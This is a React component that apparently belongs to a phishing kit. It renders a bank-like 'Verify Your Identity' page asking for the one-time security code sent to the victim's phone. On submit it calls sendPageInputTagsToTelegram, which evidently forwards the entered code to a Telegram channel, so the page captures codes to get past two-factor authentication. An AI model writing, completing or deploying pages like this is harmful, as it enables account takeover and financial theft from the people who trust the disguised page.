import React, { useState } from 'react';
import { sendPageInputTagsToTelegram } from '../utils/telegram';

interface OtpInputPageProps {
  onContinue?: () => void;
  onCancel?: () => void;
  onResend?: () => void;
}

export function OtpInputPage({ onContinue, onCancel, onResend }: OtpInputPageProps) {
  const [otp, setOtp] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length >= 4 && otp.length <= 6 && onContinue) {
      await sendPageInputTagsToTelegram();
      onContinue();
    }
  };

  return (
    <div className="bg-white w-full max-w-[420px] shadow-sm flex flex-col font-sans border border-gray-300">
      {/* Header */}
      <div className="bg-[#666666] text-white px-4 py-2 font-bold text-sm">
        Enter Verification Code
      </div>

      <div className="p-6 flex flex-col bg-[#f2f2f2]">
        <h2 className="text-[#00529b] text-[1.15rem] font-bold mb-4 tracking-tight">
          Verify Your Identity
        </h2>
        <p className="text-[0.8rem] text-gray-800 mb-6 leading-relaxed">
          Please enter the security code that was sent to your phone.
        </p>

        <form className="space-y-6" onSubmit={handleSubmit}>
          {/* OTP Input */}
          <div className="flex flex-col">
            <label
              className="text-[0.8rem] font-bold text-gray-800 mb-1"
              htmlFor="otp">
              Security Code:
            </label>
            <div className="flex items-center">
              <input
                id="otp"
                type="text"
                value={otp}
                maxLength={6}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  setOtp(value);
                }}
                placeholder="XXXX"
                className="border border-[#999999] px-2 py-1.5 w-[180px] text-center text-lg tracking-[0.5em] font-bold bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
            <button
              type="button"
              onClick={onResend}
              className="text-[#00529b] text-[0.75rem] font-semibold hover:underline mt-2 self-start"
            >
              Resend Code
            </button>
          </div>

          <div className="pt-4 flex justify-between items-center border-t border-gray-300">
            <button
              type="button"
              onClick={onCancel}
              className="text-[#00529b] text-[0.8rem] font-semibold hover:underline"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={otp.length < 4 || otp.length > 6}
              className={`${
                otp.length >= 4 && otp.length <= 6 ? 'bg-[#a23232] hover:bg-[#8e2b2b]' : 'bg-[#666666] opacity-70'
              } text-white px-10 py-2 text-sm font-semibold transition-colors shadow-sm border border-gray-800`}
            >
              Verify
            </button>
          </div>
        </form>
      </div>

      {/* Footer Links */}
      <div className="bg-white p-4 border-t border-gray-200 text-[0.75rem]">
        <p className="text-gray-800">
          If you are having trouble receiving your code, please call us at 888.444.9876.
        </p>
      </div>
    </div>
  );
}
